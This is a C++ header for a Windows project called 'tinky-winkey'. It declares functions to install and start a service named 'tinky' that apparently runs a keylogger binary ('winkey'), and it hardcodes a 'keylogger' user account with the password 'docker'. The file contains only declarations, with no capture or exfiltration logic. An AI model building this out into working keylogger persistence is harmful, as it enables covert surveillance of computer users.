#pragma once

#include "winMandatory.h"
#include <windows.h>
#include <iostream>

#include "unicode.h"

// =============== Magic variables ========== //
#define USER_NAME ".\\keylogger"
#define LOCALSYS "keylogger\\LocalSystem"
#define USER_PASS "docker"
#define SVC_NAME TEXT("tinky")
#define DEF_NAME ""
#define BINARY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\prog.exe")
// global {
#define FAILURE 0
#define SUCCESS 1
// }
// main() {
#define NFUNC 0x4
// }
// ============================================= //

// =============== Structs =============== //
typedef struct tinky {
	SC_HANDLE	HServiceControlManager;
	SC_HANDLE	HService;
}	tinky_t;
// ============================================= //

// =============== createService.cpp ===============//
int install(tinky_t *tinky);
// =============== start.cpp =============== //
int start(tinky_t *tinky);

// =============== service control managed =============== //
#define BIN_NAME ".\\winkey"
int startedBySCM(tinky_t *tinky);